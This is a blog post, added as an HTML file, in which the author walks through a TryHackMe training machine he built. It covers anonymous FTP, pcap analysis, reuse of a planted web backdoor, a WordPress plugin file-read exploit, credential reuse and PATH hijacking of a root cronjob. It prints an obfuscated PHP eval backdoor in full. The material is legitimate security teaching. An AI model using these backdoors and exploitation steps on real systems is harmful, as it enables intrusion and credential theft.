@@ -1,0 +1,339 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>[THM] Fuscator // Tzion</title>
+    <link rel="shortcut icon" href="/favicon.ico" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.104.1" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="Tzion" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="https://tzion0.github.io/css/main.min.e1fda2b3aeeaca02fa5b7c35a05438808bf1292a3bb0de84260054c1a9cf3aca.css" />
+
+    
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="[THM] Fuscator"/>
+<meta name="twitter:description" content="Fuscator is a medium dificulty boot2root machine I created for Malaysia Cyber Security Camp (MCC) 2022 as an assignment using TryHackMe. You can access it here
+Since boot2root usually is more on red team side and MCC participants have different type of skillset, hence I decided to create a machine that required both blue and red team skillset to solve it.
+There are two ways to get user foothold and one way to get root as far as I know."/>
+
+    <meta property="og:title" content="[THM] Fuscator" />
+<meta property="og:description" content="Fuscator is a medium dificulty boot2root machine I created for Malaysia Cyber Security Camp (MCC) 2022 as an assignment using TryHackMe. You can access it here
+Since boot2root usually is more on red team side and MCC participants have different type of skillset, hence I decided to create a machine that required both blue and red team skillset to solve it.
+There are two ways to get user foothold and one way to get root as far as I know." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://tzion0.github.io/posts/thm-fuscator/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-12-05T00:00:00+00:00" />
+<meta property="article:modified_time" content="2022-12-05T00:00:00+00:00" />
+
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://tzion0.github.io/"><img class="app-header-avatar" src="/avatar.jpg" alt="Tzion" /></a>
+      <h1>Tzion</h1>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="/about/">About</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/posts/">Blog</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/tags/">Tags</a>
+      </nav>
+      <p>Yet Another Infosec Blog, Enjoy!</p>
+      <div class="app-header-social">
+        
+          <a href="https://twitter.com/Tzion0" target="_blank" rel="noreferrer noopener">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-twitter">
+  <title>My Twitter</title>
+  <path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path>
+</svg>
+          </a>
+        
+          <a href="https://github.com/Tzion0" target="_blank" rel="noreferrer noopener">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
+  <title>My Github</title>
+  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
+</svg>
+          </a>
+        
+      </div>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">[THM] Fuscator</h1>
+      <div class="post-meta">
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Dec 5, 2022
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          9 min read
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tag">
+  <title>tag</title>
+  <path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7.01" y2="7"></line>
+</svg>
+              <a class="tag" href="https://tzion0.github.io/tags/thm/">THM</a>
+              <a class="tag" href="https://tzion0.github.io/tags/mcc/">MCC</a>
+              <a class="tag" href="https://tzion0.github.io/tags/2022/">2022</a>
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <p>Fuscator is a medium dificulty boot2root machine I created for Malaysia Cyber Security Camp (MCC) 2022 as an assignment using TryHackMe. You can access it <a href="https://tryhackme.com/jr/fuscator">here</a></p>
+<p>Since boot2root usually is more on red team side and MCC participants have different type of skillset, hence I decided to create a machine that required both blue and red team skillset to solve it.</p>
+<p>There are <strong>two</strong> ways to get user foothold and <strong>one</strong> way to get root as far as I know. Please hit <a href="https://twitter.com/tzion0">me</a> up on twitter if you found unintended solution, I&rsquo;ll be very happy to hear about it :D</p>
+<h1 id="user-foothold">User Foothold</h1>
+<p>As usual, we start with scanning the machine using nmap:</p>
+<pre tabindex="0"><code>nmap -sC -sV &lt;IP&gt;
+</code></pre><h4 id="result">Result</h4>
+<pre tabindex="0"><code>PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| -rw-r--r--    1 1000     1000      1373470 Nov 02 08:15 log.pcap
+|_-rw-r--r--    1 1000     1000          117 Nov 14 11:37 notes.txt
+| ftp-syst:
+|   STAT:
+| FTP server status:
+|      Connected to ::ffff:10.11.3.202
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 3
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 d52ce74f975ae2f2099328db18d4a713 (RSA)
+|   256 00452c0ea48ea25829af8875e43ad878 (ECDSA)
+|_  256 6fbdfd6d06da8552b621feffbbd6fb87 (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+| http-robots.txt: 1 disallowed entry
+|_/wp-admin/
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Fuscator
+|_http-generator: WordPress 6.1
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre><p>From the result we can see 3 ports are open and port 21 (FTP) allows anonymous login, lets connect anonymously it using ftp:</p>
+<pre tabindex="0"><code>ftp -i 10.10.139.146
+</code></pre><p>After login with anonymous:<!-- raw HTML omitted -->, we can download all the files in it:</p>
+<p><img src="/img/thm-fuscator/1.png" alt="IMG"></p>
+<p>Viewing the <code>notes.txt</code> we can see the packet capture (log.pcap) is related to a security incident.</p>
+<pre tabindex="0"><code>Dear tato,
+
+This directory contains the packet capture you requested for recent security incident.
+
+Regards,
+Fuscato
+</code></pre><p>Let&rsquo;s investigate the pcap file using Wireshark. In wireshark, we can follow the TCP stream to investigate:</p>
+<pre tabindex="0"><code>Right click on any TCP packet -&gt; Follow -&gt; TCP Stream
+</code></pre><p>After that, we can start increase the Stream and see anything stands out:</p>
+<p><img src="/img/thm-fuscator/2.png" alt="IMG"></p>
+<p>On stream 14, we can see something suspicious:</p>
+<p><img src="/img/thm-fuscator/3.png" alt="IMG"></p>
+<p>The parameter <code>pct</code> is having a base64 encoded value, decode it we can see it was a reverse shell payload:</p>
+<p><img src="/img/thm-fuscator/4.png" alt="IMG"></p>
+<p>At this point, we should try to reuse this backdoor to obtain a shell. Note that you have to include the word <code>agentX</code> in User-Agent of your request to execute commands successfully, this is why I gave the hint:</p>
+<pre tabindex="0"><code>Being attentive might skip some steps to gain user foothold
+</code></pre><p><img src="/img/thm-fuscator/5.png" alt="IMG"></p>
+<p>I notice most of the participants didn&rsquo;t notice it but they copy the suspicious request and paste it directly into Burp Suite&rsquo;s repeater which will do the job as well.</p>
+<p>You can create your reverse shell payload using this <a href="https://www.revshells.com/">site</a>, encode it using base64 and listen to the port you chose and will get a www-data shell:</p>
+<p><img src="/img/thm-fuscator/6.png" alt="IMG"></p>
+<p>Now, what if your blue team groupmates didn&rsquo;t notice the <code>agentX</code> in User-Agent and can&rsquo;t get a shell by mimic the suspicious request from your browser? This is where the red team groupmates come to rescue by exploiting a plugin in the wordpress site on port 80.</p>
+<p>Before we continue, remember to add this line to your <code>/etc/hosts</code> if you have rendering issue of the wordpress site:</p>
+<pre tabindex="0"><code>&lt;MACHINE IP&gt; fuscator.mcc
+</code></pre><p>We can get <code>fuscator.mcc</code> by browsing around the site, some links in the site point to this domain.</p>
+<p>Now, browsing the site, you should have notice this:</p>
+<p><img src="/img/thm-fuscator/7.png" alt="IMG"></p>
+<p>From the warning error we will obtain the web root path of the site and the plugin yielding the warning error.</p>
+<p>At this point, we can start enumerate the wordpress site using <code>wpscan</code>:</p>
+<pre tabindex="0"><code>wpscan --url fuscator.mcc -e p --plugins-detection mixed
+</code></pre><h4 id="result-1">Result</h4>
+<pre tabindex="0"><code>[+] URL: http://fuscator.mcc/ [10.10.139.146]
+[+] Started: Mon Dec  5 05:00:28 2022
+
+Interesting Finding(s):
+
+[+] Headers
+ | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
+ | Found By: Headers (Passive Detection)
+ | Confidence: 100%
+
+[+] robots.txt found: http://fuscator.mcc/robots.txt
+ | Interesting Entries:
+ |  - /wp-admin/
+ |  - /wp-admin/admin-ajax.php
+ | Found By: Robots Txt (Aggressive Detection)
+ | Confidence: 100%
+
+[+] XML-RPC seems to be enabled: http://fuscator.mcc/xmlrpc.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+ | References:
+ |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
+ |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
+
+[+] WordPress readme found: http://fuscator.mcc/readme.html
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] The external WP-Cron seems to be enabled: http://fuscator.mcc/wp-cron.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 60%
+ | References:
+ |  - https://www.iplocation.net/defend-wordpress-from-ddos
+ |  - https://github.com/wpscanteam/wpscan/issues/1299
+
+[+] WordPress version 6.1 identified (Outdated, released on 2022-11-01).
+ | Found By: Rss Generator (Passive Detection)
+ |  - http://fuscator.mcc/feed/, &lt;generator&gt;https://wordpress.org/?v=6.1&lt;/generator&gt;
+ |  - http://fuscator.mcc/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=6.1&lt;/generator&gt;
+
+[+] WordPress theme in use: twentytwenty
+ | Location: http://fuscator.mcc/wp-content/themes/twentytwenty/
+ | Latest Version: 2.1 (up to date)
+ | Last Updated: 2022-11-02T00:00:00.000Z
+ | Readme: http://fuscator.mcc/wp-content/themes/twentytwenty/readme.txt
+ | Style URL: http://fuscator.mcc/wp-content/themes/twentytwenty/style.css?ver=2.1
+ | Style Name: Twenty Twenty
+ | Style URI: https://wordpress.org/themes/twentytwenty/
+ | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor...
+ | Author: the WordPress team
+ | Author URI: https://wordpress.org/
+ |
+ | Found By: Css Style In Homepage (Passive Detection)
+ | Confirmed By: Css Style In 404 Page (Passive Detection)
+ |
+ | Version: 2.1 (80% confidence)
+ | Found By: Style (Passive Detection)
+ |  - http://fuscator.mcc/wp-content/themes/twentytwenty/style.css?ver=2.1, Match: &#39;Version: 2.1&#39;
+
+[+] Enumerating Most Popular Plugins (via Passive and Aggressive Methods)
+ Checking Known Locations - Time: 00:04:29 &lt;================================== &gt; (1476 / 1500) 98.40%  ETA: 00:00:04
+ Checking Known Locations - Time: 00:04:31 &lt;==================================&gt; (1500 / 1500) 100.00% Time: 00:04:31
+[+] Checking Plugin Versions (via Passive and Aggressive Methods)
+
+[i] Plugin(s) Identified:
+
+[+] akismet
+ | Location: http://fuscator.mcc/wp-content/plugins/akismet/
+ | Latest Version: 5.0.2
+ | Last Updated: 2022-12-01T17:18:00.000Z
+ |
+ | Found By: Known Locations (Aggressive Detection)
+ |  - http://fuscator.mcc/wp-content/plugins/akismet/, status: 500
+ |
+ | The version could not be determined.
+
+[+] health-check
+ | Location: http://fuscator.mcc/wp-content/plugins/health-check/
+ | Last Updated: 2022-11-01T23:08:00.000Z
+ | Readme: http://fuscator.mcc/wp-content/plugins/health-check/readme.txt
+ | [!] The version is out of date, the latest version is 1.5.1
+ |
+ | Found By: Known Locations (Aggressive Detection)
+ |  - http://fuscator.mcc/wp-content/plugins/health-check/, status: 403
+ |
+ | Version: 1.4.0 (100% confidence)
+ | Found By: Readme - Stable Tag (Aggressive Detection)
+ |  - http://fuscator.mcc/wp-content/plugins/health-check/readme.txt
+ | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
+ |  - http://fuscator.mcc/wp-content/plugins/health-check/readme.txt
+
+[+] w3-total-cache
+ | Location: http://fuscator.mcc/wp-content/plugins/w3-total-cache/
+ | Last Updated: 2022-10-31T20:03:00.000Z
+ | Readme: http://fuscator.mcc/wp-content/plugins/w3-total-cache/readme.txt
+ | [!] The version is out of date, the latest version is 2.2.7
+ |
+ | Found By: Known Locations (Aggressive Detection)
+ |  - http://fuscator.mcc/wp-content/plugins/w3-total-cache/, status: 403
+ |
+ | Version: 0.9.2.10 (80% confidence)
+ | Found By: Readme - Stable Tag (Aggressive Detection)
+ |  - http://fuscator.mcc/wp-content/plugins/w3-total-cache/readme.txt
+</code></pre><p>From the result we can see multiple outdated plugins, but the main focus is w3-total-cache, which is vulnerable to Unauthenticated Arbitrary File Read, we can get the exploit module through <a href="https://www.exploit-db.com/exploits/49317">exploitdb</a></p>
+<p>The exploit module is written in Ruby language, I&rsquo;ll leave it as a small exercise for readers to import it into their msfconsole.</p>
+<p>Once the exploit module is imported, we can set the required options and execute it:</p>
+<p><img src="/img/thm-fuscator/8.png" alt="IMG"></p>
+<p><img src="/img/thm-fuscator/9.png" alt="IMG"></p>
+<p>From now on, since we have the root path of wordpress site, we have two options:</p>
+<ol>
+<li>Read the <code>wp-config.php</code> to obtain credential and try SSH into users obtained from <code>/etc/passwd</code>.</li>
+<li>Read the backdoor <code>utils-bd.php</code> to learn more about it.</li>
+</ol>
+<p>The first option will succeed by SSH login as fuscato user with the password obtained from <code>wp-config.php</code>.</p>
+<p>We will be digging into second option. Setting the FILEPATH of the exploit to <code>/srv/www/wordpress/utils-bd.php</code>, we will obtain its source code:</p>
+<p><img src="/img/thm-fuscator/10.png" alt="IMG"></p>
+<p>The source code is obfuscated:</p>
+<pre tabindex="0"><code>&lt;?php function flkxkz($jhVI)
+{
+$jhVI=gzinflate(base64_decode($jhVI));
+ for($i=0;$i&lt;strlen($jhVI);$i++)
+ {
+$jhVI[$i] = chr(ord($jhVI[$i])-1);
+ }
+ return $jhVI;
+ }eval(flkxkz(&#34;U1QEAu6sdEVNpbS8wtIqTUXVhGC3oDC3kNAYjcKUUo04RS1FdXXFrJKStFJN1YQQt+Bwt+AYDc/Q0MCEMCAvwcnDzT9UI05LS7GGWxEKstI1S0qLCwtK8OnQVdRIykjLL43U0FJUsrNTTE/KLUnTQhjCVVJVUpqWp5mcVJJmbpqQmpZSkJqmie48LS0buI467jpuB3sA&#34;));?&gt;
+</code></pre><p>You can choose to deobfuscate it manually, however, by changing the <code>eval()</code> to <code>echo()</code>, we will get the clean deobfuscated source code:</p>
+<p><img src="/img/thm-fuscator/11.png" alt="IMG"></p>
+<p>From the source code, we will know that <code>agentX</code> is required to execute commands successfully, thus getting a www-data shell.</p>
+<p>After getting the www-data shell, we can obtain a password located in <code>wp-config.php</code>, which can be use to login as fuscato by reusing the password:</p>
+<p><img src="/img/thm-fuscator/12.png" alt="IMG"></p>
+<p>The user flag is located in <code>/home/fucsato/user.txt</code>.</p>
+<h1 id="privilege-escalation">Privilege Escalation</h1>
+<p>The privilege escalation point actually lies at <code>/etc/crontab</code>, however when you view it using <code>cat</code>, you won&rsquo;t see any suspicious cronjob:</p>
+<p><img src="/img/thm-fuscator/13.png" alt="IMG"></p>
+<p>To view the suspicious cronjob, you have use text editor like nano (<del>I love vim</del>):</p>
+<p><img src="/img/thm-fuscator/13.png" alt="IMG"></p>
+<p>The objective of hiding the cronjob is to match the storyline of this machine, and the inspiration is obtained from <a href="https://cybergladius.com/redteam-tip-hiding-cronjobs/">here</a></p>
+<p>From the cronjob we know that a suspicious binary is executing as root every minute, so let&rsquo;s start analyzing it.</p>
+<p>This binary is actually obfuscated using <a href="https://github.com/xoreaxeaxeax/movfuscator">movfuscator</a> and you can deobfuscate it using <a href="https://github.com/kirschju/demovfuscator">demovfuscator</a>. However, deobfuscate the binary won&rsquo;t recover much but atleast you learn more about the behavior of the binary. Moreover, since this is a medium machine, reversing/deobfuscating/decrypting is not required but readers who are interested can attempt to decrypt it.</p>
+<p>Moving on, the hint given <code>Root - Don't trace my path!</code> actually indicating <code>ltrace</code> and <code>path injection</code>. Hence we can attempt to ltrace the binary:</p>
+<pre tabindex="0"><code>ltrace ./66-motd-update
+</code></pre><p><img src="/img/thm-fuscator/15.png" alt="IMG"></p>
+<p>Note that the string is not fully outputted, we can increase it using <code>-s 500</code>:</p>
+<pre tabindex="0"><code>ltrace -s 500 ./66-motd-update
+</code></pre><p><img src="/img/thm-fuscator/16.png" alt="IMG"></p>
+<p>From the above picture we can see it attempt to execute a reverse shell. However, the <code>nc</code> and <code>timeout</code> specified is not using absolute path, making them vulnerable to Path Hijacking.</p>
+<h3 id="path-hijacking">Path Hijacking</h3>
+<p>Linux will actually search through every directory located in <strong>$PATH</strong> environment variable when there is an execution of binary without absolute path. For example:</p>
+<p><img src="/img/thm-fuscator/17.png" alt="IMG"></p>
+<p>From the picture above we can see <code>nc</code> binary is located at <code>/bin/nc</code>, when we execute <code>nc</code> binary by simply typing <code>nc</code>, Linux will search through all the directories in <strong>$PATH</strong> environment variable from left to right until it found a binary called <code>nc</code>, which means it will start finding <code>nc</code> binary from:</p>
+<pre tabindex="0"><code>/usr/local/sbin -&gt; /usr/local/bin -&gt; /usr/sbin -&gt; /usr/bin -&gt; /sbin -&gt; /bin -&gt; /usr/games -&gt; /usr/local/games -&gt; /snap/bin
+</code></pre><p>Since <code>nc</code> is located in <code>/bin/nc</code>, if we place a binary with the same name as <code>nc</code> in preceding directories of <code>/bin</code>, Linux will execute it instead of the actual <code>/bin/nc</code>.</p>
+<p>Looking at <code>/usr/local/sbin</code> and <code>/usr/local/bin</code>, we have the privilege to write into it as we are belong to staff group:</p>
+<p><img src="/img/thm-fuscator/18.png" alt="IMG"></p>
+<p>Hence, write a reverse shell into <code>/usr/local/sbin/nc</code>, finger cross, and we eventually will get a shell:</p>
+<p><img src="/img/thm-fuscator/19.png" alt="IMG"></p>
+<p>That&rsquo;s it, the root flag is located in <code>/root/root.txt</code>.</p>
+<p>Thank you for reading till the end and hopefully you learned something new &lt;3</p>
+
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
